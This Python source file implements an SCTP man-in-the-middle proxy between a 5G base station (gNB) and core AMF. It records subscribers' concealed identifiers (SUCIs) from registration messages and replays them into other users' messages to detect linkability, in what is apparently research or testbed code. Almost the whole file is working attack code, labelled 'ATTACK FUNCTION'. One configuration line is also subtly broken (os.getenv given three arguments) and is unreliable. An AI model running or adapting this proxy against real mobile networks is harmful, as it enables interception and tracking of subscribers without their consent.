import os
import socket
import threading
import sctp
from pycrate_asn1dir.NGAP import NGAP_PDU_Descriptions
from pycrate_mobile.NAS5G import parse_NAS5G
from copy import deepcopy
import argparse
import json
from pathlib import Path
from threading import Lock


# Config 
_NGAP_PDU_PROTO = NGAP_PDU_Descriptions.NGAP_PDU

AMF_IP      = os.getenv("AMF_IP","0.0.0.0","127.0.0.1")
AMF_PORT    = int(os.getenv("AMF_PORT","38412"))
LISTEN_PORT = int(os.getenv("LISTEN_PORT","38412"))

# JSON Config
RECORD_MODE = False
JSON_FILE = Path("collected.json")
_json_lock = Lock()


# NAS message types
NAS_AUTH_RESPONSE = 0x57
NAS_AUTH_FAILURE = 0x59

# NGAP procedure codes
PROC_INITIAL_UE = 15
PROC_UPLINK_NAS = 46

# PPID for AMF, else failure
NAS_PPID = 60

# ATTACK SCENARIO - Default testing one
FAKE_SUCI = {
    "SupiFormat":         0,
    "PLMN":                "20895",
    "RoutingIndicator":   "0210",
    "ProtectionSchemeId": 1,
    "HomeNetworkPKI":     1,

    "ECCEphemPK": bytes.fromhex("eef6ae97fe47bff5827ebcc9ac97f7e224e26b3867988757bebdb1c28f31aa78"),
    "CipherText": bytes.fromhex("f153a53375"),
    "MAC": bytes.fromhex("efe3f139dd309fd1")
}

# JSON helpers

def append_suci(suci: dict) -> None:
    """Append a SUCI in a recorded JSON list"""
    try:
        with _json_lock:
            if JSON_FILE.exists():
                try:
                    with open(JSON_FILE, "r") as f:
                        data = json.load(f)
                        if not isinstance(data, list):
                            data = []
                except json.JSONDecodeError:
                    data = []
            else:
                data = []

            data.append(suci)

            with open(JSON_FILE, "w") as f:
                json.dump(data, f, indent=2)

    except Exception as e:
        print(f"ERROR - append_suci failed: {e}")


def decode_suci_record(record: dict) -> dict:
    """Convert JSON record"""
    return {
        "PLMN": record["PLMN"],
        "RoutingIndicator": record["RoutingIndicator"],
        "ProtectionSchemeId": record["ProtectionSchemeId"],
        "HomeNetworkPKI": record["HomeNetworkPKI"],
        "ECCEphemPK": bytes.fromhex(record["ECCEphemPK"]),
        "CipherText": bytes.fromhex(record["CipherText"]),
        "MAC": bytes.fromhex(record["MAC"]),
    }


def get_suci(index: int) -> dict | None:
    """Retrieve the SUCI."""
    try:
        if not JSON_FILE.exists():
            print("No collected.json file found")
            return None

        with _json_lock:
            with open(JSON_FILE, "r") as f:
                data = json.load(f)

        if not isinstance(data, list):
            print("Invalid JSON format (not a list)")
            return None

        if index < 0 or index >= len(data):
            print(f"Index {index} out of range (size={len(data)})")
            return None

        suci = data[index]

        if suci:
            return decode_suci_record(suci)

    except Exception as e:
        print(f"ERROR - get_suci failed: {e}")
        return None





# NGAP helpers
def NGAP_PDU():
    return deepcopy(_NGAP_PDU_PROTO)


def decode_ngap(data: bytes):
    pdu = NGAP_PDU()
    try:
        pdu.from_aper(data)
        return pdu
    except Exception as e:
        print(f"ERROR - NGAP decode failed: {e}")
        return None

def get_procedure_code(pdu) -> int | None:
    try:
        return pdu.get_val()[1]["procedureCode"]
    except Exception:
        return None

def get_ran_ue_id(pdu) -> int | None:
    try:
        ies = pdu.get_val()[1]["value"][1]["protocolIEs"]
        for ie in ies:
            if ie["id"] == 85:
                return ie["value"][1]
    except Exception:
        pass
    return None


def get_nas_msg_type(nas_bytes: bytes) -> int | None:
    try:
        msg, err = parse_NAS5G(nas_bytes)
        if err:
            return None
        return msg["Type"].get_val()
    except Exception:
        return None

def get_nas_pdu(pdu) -> bytes | None:
    try:
        ies = pdu.get_val()[1]["value"][1]["protocolIEs"]
        for ie in ies:
            if ie["id"] == 38:
                return ie["value"][1]
    except Exception:
        pass
    return None

def set_nas_pdu(pdu, new_nas: bytes) -> bytes | None:
    try:
        ies = pdu.get_val()[1]["value"][1]["protocolIEs"]
        for ie in ies:
            if ie["id"] == 38:
                ie["value"] = (ie["value"][0], new_nas)
                break
        return pdu.to_aper()
    except Exception as e:
        print(f"ERROR - NGAP rebuild failed: {e}")
        return None


# ATTACK FUNCTION
def replace_suci(nas_bytes: bytes) -> bytes | None:
    try:
        msg, err = parse_NAS5G(nas_bytes)
        if err:
            print(f"ERROR - NAS parse error: {err}")
            return None
        
        try:
            # print(msg.show())
            original = msg["5GSID"].get_val()
            print(f"Original mobile identity: {original}")
        except Exception:
            pass
        

        FAKE_SUCI = get_suci(0)

        if FAKE_SUCI is None:
            print("ERROR - no SUCI available, forwarding original")
            return None

        fgsid_ie = msg["5GSID"]
        fgsid = fgsid_ie["5GSID"]
        suci = fgsid["Value"]

        # Replace non encryptet SUCI values
        suci["PLMN"].encode(FAKE_SUCI["PLMN"])
        suci["RoutingInd"].encode(FAKE_SUCI["RoutingIndicator"])
        suci["ProtSchemeID"].set_val(FAKE_SUCI["ProtectionSchemeId"])
        suci["HNPKID"].set_val(FAKE_SUCI["HomeNetworkPKI"])
        

        # Read scheme output
        out = suci["Output"].get_alt()
        orig_pk  = out["ECCEphemPK"].get_val()
        orig_ct  = out["CipherText"].get_val()
        orig_mac = out["MAC"].get_val()
        print(f" Original ECCEphemPK: {orig_pk.hex()}")
        print(f"Original CipherText: {orig_ct.hex()}")
        print(f"Original MAC: {orig_mac.hex()}")

        # Replace scheme output 
        out["ECCEphemPK"].from_bytes(FAKE_SUCI["ECCEphemPK"])
        out["CipherText"].from_bytes(FAKE_SUCI["CipherText"])
        out["MAC"].from_bytes(FAKE_SUCI["MAC"])


        patched = msg.to_bytes()
        print(f"Replaced SUCI with: {FAKE_SUCI}")
        return patched
    except Exception as e:
        print(f"ERROR - replace_suci failed: {e}")
        return None

def record_suci(nas_bytes: bytes) -> None:
    try:
        msg, err = parse_NAS5G(nas_bytes)
        if err:
            print(f"ERROR - NAS parse error: {err}")
            return None
        
        try:
            # print(msg.show())
            original = msg["5GSID"].get_val()
            print(f"Original mobile identity: {original}")
        except Exception:
            pass
        
        fgsid_ie = msg["5GSID"]
        fgsid = fgsid_ie["5GSID"]
        suci = fgsid["Value"]

        # Extract cleartext fields
        record = {
            "PLMN": suci["PLMN"].decode() if hasattr(suci["PLMN"], "decode") else str(suci["PLMN"]),
            "RoutingIndicator": suci["RoutingInd"].decode() if hasattr(suci["RoutingInd"], "decode") else str(suci["RoutingInd"]),
            "ProtectionSchemeId": suci["ProtSchemeID"].get_val(),
            "HomeNetworkPKI": suci["HNPKID"].get_val(),
        }

        # Extract encrypted output
        out = suci["Output"].get_alt()

        record.update({
            "ECCEphemPK": out["ECCEphemPK"].get_val().hex(),
            "CipherText": out["CipherText"].get_val().hex(),
            "MAC": out["MAC"].get_val().hex()
        })

        print(f"Recording SUCI: {record}")

        append_suci(record)


    except Exception as e:
        print(f"ERROR - record_suci failed: {e}")
        return None



# Proxy threads 
def uplink(gnb_sock, amf_sock):
    """gNB → AMF"""
    while True:
        try:
            # Listener for gNB packets
            fromaddr, flags, data, notif = gnb_sock.sctp_recv(65535)
            if not data:
                print("Uplink: connection closed")
                break
            
            # Decode PDU and retrieve 
            pdu  = decode_ngap(data)
            proc = get_procedure_code(pdu) if pdu else None


            # Initial UE message
            if pdu and proc == PROC_INITIAL_UE:
                ran_ue_id = get_ran_ue_id(pdu)
                print(f"InitialUEMessage — RAN-UE-NGAP-ID: {ran_ue_id}")

                # Retreive NAS and replace it before forwarding
                nas = get_nas_pdu(pdu)
                if nas:
                    
                    # Records SUCI instead of changing the value
                    if RECORD_MODE:
                        record_suci(nas)
                        amf_sock.sctp_send(data, ppid=NAS_PPID)
                        continue

                    patched_nas = replace_suci(nas)
                    if patched_nas:
                        rebuilt = set_nas_pdu(pdu, patched_nas)
                        if rebuilt:
                            print("Forwarding patched InitialUEMessage")
                            amf_sock.sctp_send(rebuilt, ppid=NAS_PPID)
                            continue
                        else:
                            print("Rebuild failed — forwarding original")
                    else:
                        print("Patch failed — forwarding original")
                else:
                    print("No NAS-PDU — forwarding original")
            
            # Auth response
            elif pdu and proc == PROC_UPLINK_NAS:
                ran_ue_id = get_ran_ue_id(pdu)
                print(f"Authentication Response/Failure — RAN-UE-NGAP-ID: {ran_ue_id}")
                nas = get_nas_pdu(pdu)
                if nas:
                    msg_type = get_nas_msg_type(nas)

                    if msg_type == NAS_AUTH_RESPONSE:
                        print(f"Authentication Response — RAN-UE-NGAP-ID: {ran_ue_id}")


                    elif msg_type == NAS_AUTH_FAILURE:
                        print(f"Authentication Failure — RAN-UE-NGAP-ID: {ran_ue_id} - SUCI TO UE FOUND!!!")

            amf_sock.sctp_send(data, ppid=NAS_PPID)

        except Exception as e:
            print(f"ERROR - uplink error {type(e).__name__}: {e}")
            break


 # Listener for AMF packets and forwards to gNB
def downlink(gnb_sock, amf_sock):
    """AMF → gNB"""
    while True:
        try:
            fromaddr, flags, data, notif = amf_sock.sctp_recv(65535)
            if not data:
                print("Downlink: connection closed")
                break

            gnb_sock.sctp_send(data, ppid=NAS_PPID)

        except Exception as e:
            print(f"ERROR - downlink error {type(e).__name__}: {e}")
            break

# Connection handler
def handle(gnb_sctp):
    print(f" gNB connected — opening AMF {AMF_IP}:{AMF_PORT}")
    amf_sctp = sctp.sctpsocket_tcp(socket.AF_INET)

    amf_sctp.connect((AMF_IP, AMF_PORT))

    t1 = threading.Thread(target=uplink,   args=(gnb_sctp, amf_sctp), daemon=True)
    t2 = threading.Thread(target=downlink, args=(gnb_sctp, amf_sctp), daemon=True)
    t1.start()
    t2.start()
    t1.join()
    t2.join()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--save", action="store_true", help="Record SUCIs instead of replacing")
    args = parser.parse_args()
    
    global RECORD_MODE
    RECORD_MODE = args.save

    
    print(f"SUCI proxy starting")
    print(f"Listening on 0.0.0.0:{LISTEN_PORT}")
    print(f"Forwarding to AMF {AMF_IP}:{AMF_PORT}")
    
    if RECORD_MODE:
        print("Mode: RECORD (SUCI will be saved to collected.json)")
    else:
        print(f"Mode: REPLACE SUCI with a recorded one")

    server = sctp.sctpsocket_tcp(socket.AF_INET)
    server.bind(("0.0.0.0", LISTEN_PORT))
    server.listen(5)

    while True:
        conn, addr = server.accept()
        print(f"New gNB connection from {addr}")
        t = threading.Thread(target=handle, args=(conn,), daemon=True)
        t.start()

if __name__ == "__main__":
    main()